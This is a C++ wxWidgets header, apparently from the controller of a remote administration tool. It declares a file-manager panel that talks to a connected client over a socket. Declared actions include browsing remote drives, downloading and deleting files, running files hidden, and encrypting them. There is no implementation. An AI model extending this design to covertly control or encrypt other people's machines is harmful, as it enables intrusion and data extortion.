#pragma once

#ifndef __PANEL_FILE_MANAGER
#define __PANEL_FILE_MANAGER

#include "headers.hpp"

class ListCtrlManager;

class panelFileManager: public wxFrame{
	public:
		ListCtrlManager* listManager = nullptr;
		
		void CrearLista(wxWindow* pParent);
		wxString RutaActual();
		void EnviarComando(std::string pComando, int iComando);
		void EnviarArchivo(const std::string cPath, const char* rPath, std::string strCliente, std::string strID);

		panelFileManager(wxWindow* pParent, SOCKET sck, std::string _strID, std::string _strIP, ByteArray c_key);
		
		//Eventos
		void OnToolBarClick(wxCommandEvent& event);
		void OnPath(wxCommandEvent& event);
		
		int iMODE = -1;
		//wxStaticText* p_RutaActual = nullptr;
		std::vector<wxString> c_RutaActual;
		
		void ActualizarRuta(const char*& pBuffer);

		ByteArray enc_key;

		wxTextCtrl* txt_Path = nullptr;
		wxTextCtrl* txt_Log = nullptr;
	private:
		std::string strID = "";
		std::string strIP = "";
		SOCKET sckCliente = INVALID_SOCKET;

		wxToolBar* p_ToolBar = nullptr;
		
		wxDECLARE_EVENT_TABLE();

};

class ListCtrlManager : public wxListCtrl {
	public:
		panelFileManager* itemp = nullptr;
		wxActivityIndicator* m_indicator = nullptr;

		ListCtrlManager(wxWindow* parent, const wxWindowID id, 
			            const wxPoint& pos, const wxSize& size, long style, std::string _strID, std::string _strIP, SOCKET _sck)
			: wxListCtrl(parent, id, pos, size, style){
			strIP = _strIP;
			strID = _strID; 
			sckCliente = _sck;
		}

		void ListarDir(const char* strData);
		void ListarEquipo(const std::vector<std::string> vcDrives);
		
		//Carga
		void MostrarCarga();
		void OcultarCarga();

		void CargarImagenes();

		//Eventos acciones menu contextual
		void OnCrearFolder(wxCommandEvent& event);
		void OnCrearArchivo(wxCommandEvent& event);
		void OnBorrarArchivo(wxCommandEvent& event);
		void OnEditarArchivo(wxCommandEvent& event);
		void OnRenombrarArchivo(wxCommandEvent& event);
		void OnDescargarArchivo(wxCommandEvent& event);
		void OnEjecutarArchivo_Visible(wxCommandEvent& event);
		void OnEjecutarArchivo_Oculto(wxCommandEvent& event);
		void OnEncriptarArchivo(wxCommandEvent& event);

	private:
		wxImageList* img_list = nullptr;
		std::mutex mtx_fm;
		std::mutex mtx_carga;
		SOCKET sckCliente = INVALID_SOCKET;

		void OnActivated(wxListEvent& event);

		void ShowContextMenu(const wxPoint& pos, bool isFolder);
		void OnContextMenu(wxContextMenuEvent& event);


		std::string ArchivoSeleccionado();
		std::string CarpetaActual();
		std::string strID = "";
		std::string strIP = "";
		
		

		wxDECLARE_EVENT_TABLE();
};


#endif